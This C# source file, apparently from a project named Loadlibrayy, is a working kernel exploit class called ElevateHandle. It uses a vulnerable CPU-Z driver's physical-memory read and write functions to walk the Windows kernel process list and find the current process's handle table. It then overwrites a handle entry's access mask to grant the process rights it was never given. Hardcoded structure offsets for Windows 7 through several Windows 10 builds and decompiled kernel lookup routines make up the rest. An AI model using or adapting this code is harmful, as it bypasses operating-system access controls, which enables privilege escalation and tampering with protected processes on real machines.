using Loadlibrayy.Logger;
using Loadlibrayy.Natives;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace DriverExploits
{
    public unsafe static class ElevateHandle
    {
        public static CPUZ Driver = new CPUZ();

        #region Private Properties
        private static NT.ProcessContext g_Context { get; set; }
        private static ulong g_VersionLong { get; set; }
        private static uint g_OffsetDirectoryTable { get; set; }
        private static uint g_OffsetProcessId { get; set; }
        private static uint g_OffsetProcessLinks { get; set; }
        private static uint g_OffsetObjectTable { get; set; }
        private static bool g_IsWindows7Machine { get; set; }
        #endregion

        public static void Attach() => g_Context = FindProcessInfo((uint)Process.GetCurrentProcess().Id);

        public static bool Elevate(ulong handle, dynamic desiredAccess)
        {
            var handleTableAddress = ReadSystemMemory<ulong>(g_Context.KernelEntry + g_OffsetObjectTable);
            var handleTable = ReadSystemMemory<_HANDLE_TABLE>(handleTableAddress);
            
            NT._HANDLE_TABLE_ENTRY* entryAddress = g_IsWindows7Machine ? 
                ExpLookupHandleTableEntryWin7(&handleTable, handle) : 
                ExpLookupHandleTableEntry(&handleTable, handle);
            
            if ((ulong)entryAddress == 0)
                throw new Exception("ExpLookupHandleTableEntry/7 failed");
            
            var entry = ReadSystemMemory<NT._HANDLE_TABLE_ENTRY>((ulong)entryAddress);
            
            bool didElevate = WriteSystemMemory((ulong)entryAddress + sizeof(ulong), (ulong)desiredAccess);

            Log.LogInfo($"Elevating {handle.ToString("x2")} -> {desiredAccess.ToString("x2")} ? {didElevate}");

            return didElevate;
        }
        
        public static void UpdateDynamicData()
        {
            NT._OSVERSIONINFOEXW osvi = new NT._OSVERSIONINFOEXW();
            osvi.dwOSVersionInfoSize = (uint)Marshal.SizeOf(typeof(NT._OSVERSIONINFOEXW));

            NT.RtlGetVersion(&osvi);
            g_VersionLong = (osvi.dwMajorVersion << 16) | (osvi.dwMinorVersion << 8) | osvi.wServicePackMajor;

            switch (g_VersionLong)
            {
                case 0x060101/*win 7*/:
                    g_IsWindows7Machine = true;
                    g_OffsetDirectoryTable = 0x028;
                    g_OffsetProcessId = 0x180;
                    g_OffsetProcessLinks = 0x188;
                    g_OffsetObjectTable = 0x200;
                    break;

                case 0x060200/*win 8*/:
                case 0x060300/*win 8.1*/:
                    g_OffsetDirectoryTable = 0x028;
                    g_OffsetProcessId = 0x2e0;
                    g_OffsetProcessLinks = 0x2e8;
                    g_OffsetObjectTable = 0x408;
                    break;

                case 0x0A0000 /*win 10*/:
                    {
                        switch (osvi.dwBuildNumber)
                        {
                            case 10240:
                            case 10586:
                            case 14393:
                                g_OffsetDirectoryTable = 0x028;
                                g_OffsetProcessId = 0x2E8;
                                g_OffsetProcessLinks = 0x2F0;
                                g_OffsetObjectTable = 0x418;
                                break;
                            case 15063:
                                g_OffsetDirectoryTable = 0x028;
                                g_OffsetProcessId = 0x2E0;
                                g_OffsetProcessLinks = 0x2E8;
                                g_OffsetObjectTable = 0x418;
                                break;

                            default:
                                throw new Exception("Unsupported dwBuildNumber");
                        }
                        break;
                    }

                default:
                    throw new Exception("Unsupported version_long");
            }
        }

        // IDA F5 LOL
        private static NT._HANDLE_TABLE_ENTRY* ExpLookupHandleTableEntryWin7(void* HandleTable, ulong Handle)
        {
            ulong v2;     // r8@2
            ulong v3;     // rcx@2
            ulong v4;     // r8@2
            ulong result; // rax@4
            ulong v6;     // [sp+8h] [bp+8h]@1
            ulong table = (ulong)HandleTable;

            v6 = Handle;
            v6 = Handle & 0xFFFFFFFC;
            if (v6 >= *(uint*)(table + 92))
            {
                result = 0;
            }
            else
            {
                v2 = (*(ulong*)table);
                v3 = (*(ulong*)table) & 3;
                v4 = v2 - (uint)v3;
                if ((uint)v3 > 0)
                {
                    if ((uint)v3 == 1)
                        result = ReadSystemMemory<ulong>((((Handle - (Handle & 0x3FF)) >> 7) + v4)) + 4 * (Handle & 0x3FF);
                    else
                        result = ReadSystemMemory<ulong>((ulong)(ReadSystemMemory<ulong>((ulong)(((((Handle - (Handle & 0x3FF)) >> 7) - (((Handle - (Handle & 0x3FF)) >> 7) & 0xFFF)) >> 9) + v4)) + (((Handle - (Handle & 0x3FF)) >> 7) & 0xFFF))) + 4 * (Handle & 0x3FF);
                }
                else
                {
                    result = v4 + 4 * Handle;
                }
            }
            return (NT._HANDLE_TABLE_ENTRY*)result;
        }
        private static NT._HANDLE_TABLE_ENTRY* ExpLookupHandleTableEntry(void* HandleTable, ulong Handle)
        {
            ulong v2; // rdx@1
            long v3; // r8@2
            ulong result; // rax@4
            ulong v5;

            ulong a1 = (ulong)HandleTable;

            v2 = Handle & 0xFFFFFFFFFFFFFFFCu;
            if (v2 >= *(uint*)a1)
            {
                result = 0;
            }
            else
            {
                v3 = (long)*(ulong*)(a1 + 8);
                if ((*(ulong*)(a1 + 8) & 3) > 0)
                {
                    if ((*(uint*)(a1 + 8) & 3) == 1)
                    {
                        v5 = ReadSystemMemory<ulong>((ulong)v3 + 8 * (v2 >> 10) - 1);
                        result = v5 + 4 * (v2 & 0x3FF);
                    }
                    else
                    {
                        v5 = ReadSystemMemory<ulong>(ReadSystemMemory<ulong>((ulong)v3 + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF));
                        result = v5 + 4 * (v2 & 0x3FF);
                    }
                }
                else
                {
                    result = (ulong)v3 + 4 * v2;
                }
            }
            return (NT._HANDLE_TABLE_ENTRY*)result;
        }

        // MEMORY FUNCTIONS
        private static T ReadSystemMemory<T>(ulong basepointer)
        {
            var buf = (ulong*)Marshal.AllocHGlobal(Marshal.SizeOf(typeof(T)));

            if (!ReadSystemMemory(basepointer, (ulong)buf, (uint)Marshal.SizeOf(typeof(T))))
                throw new Exception("Read failed");

            T result = (T)Marshal.PtrToStructure((IntPtr)buf, typeof(T));

            Marshal.FreeHGlobal((IntPtr)buf);

            return result;
        }
        private static bool WriteSystemMemory<T>(ulong basepointer, T value)
        {
            var buf = (ulong)Marshal.AllocHGlobal(Marshal.SizeOf(typeof(T)));
            Marshal.StructureToPtr(value, (IntPtr)buf, false);

            bool success = WriteSystemMemory(basepointer, buf, (uint)Marshal.SizeOf(typeof(T)));

            Marshal.FreeHGlobal((IntPtr)buf);

            return success;
        }
        private static bool ReadSystemMemory(ulong basepointer, ulong buf, uint len)
        {
            ulong phys = Driver.TranslateLinearAddress(g_Context.DirectoryBase, basepointer);

            return Driver.ReadPhysicalAddress(phys, buf, len);
        }
        private static bool WriteSystemMemory(ulong basepointer, ulong buf, uint len)
        {
            ulong phys = Driver.TranslateLinearAddress(g_Context.DirectoryBase, basepointer);

            return Driver.WritePhysicalAddress(phys, buf, len);
        }
        
        private static ulong GetKernelBase()
        {
            ulong buffer;
            uint bufferSize = 2048;

            buffer = (ulong)Marshal.AllocHGlobal((int)bufferSize);

            uint status = NT.NtQuerySystemInformation(11/*SystemModuleInformation*/, buffer, (uint)bufferSize, out bufferSize);

            if (status == 0xC0000004L/*STATUS_INFO_LENGTH_MISMATCH*/)
            {
                Marshal.FreeHGlobal((IntPtr)buffer);
                buffer = (ulong)Marshal.AllocHGlobal((int)bufferSize);

                status = NT.NtQuerySystemInformation(11/*SystemModuleInformation*/, buffer, (uint)bufferSize, out bufferSize);
            }

            if (status != 0)
                throw new Exception("GetKernelBase Failed");

            NT._RTL_PROCESS_MODULES* modulesPointer = (NT._RTL_PROCESS_MODULES*)buffer;

            return (ulong)modulesPointer->Modules.ImageBase;
        }
        private static byte* FindKernelProcedure(string szName)
        {
            ulong ntoskrnlHandle = NT.LoadLibrary("ntoskrnl.exe");
            ulong kernelBase = GetKernelBase();

            ulong functionPointer = NT.GetProcAddress(ntoskrnlHandle, szName);

            return (byte*)(functionPointer - ntoskrnlHandle + kernelBase);
        }
        private static NT.ProcessContext FindProcessInfo(uint targetProcessId)
        {
            NT.ProcessContext processContext = new NT.ProcessContext()
            {
                ProcessId = 0
            };

            // GET POINTER TO THE SYSTEM EPROCESS
            ulong eprocessPointer = (ulong)FindKernelProcedure("PsInitialSystemProcess");

            // READ EPROCESS ADDRESS
            ulong ntosEntry = Driver.ReadSystemAddress<ulong>(eprocessPointer);

            var listHead = ntosEntry + g_OffsetProcessLinks;
            var lastLink = Driver.ReadSystemAddress<ulong>(listHead + sizeof(ulong));

            // ITERATE ALL PROCESSES
            for (var currentLink = listHead; currentLink != lastLink; currentLink = Driver.ReadSystemAddress<ulong>(currentLink))
            {
                var currentEntry = currentLink - g_OffsetProcessLinks;

                var processId = Driver.ReadSystemAddress<ulong>(currentEntry + g_OffsetProcessId);
                
                // PID is a match
                if (processId == targetProcessId)
                {
                    processContext.ProcessId = targetProcessId;
                    processContext.DirectoryBase = Driver.ReadSystemAddress<ulong>(currentEntry + g_OffsetDirectoryTable);
                    processContext.KernelEntry = currentEntry;
                    break;
                }
            }

            return processContext;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        public struct _HANDLE_TABLE
        {
            public ulong TableCode;
            public ulong QuotaProcess;
            public ulong UniqueProcessId;
            public ulong HandleLock;
            public ulong Flink;
            public ulong Blink;
            public ulong HandleContentionEvent;
            public ulong DebugInfo;
            public int ExtraInfoPages;
            public uint Flags;
            public uint FirstFreeHandle;
            public ulong LastFreeHandleEntry;
            public uint HandleCount;
            public uint NextHandleNeedingPool;
            public uint HandleCountHighWatermark;
        }
    }
}
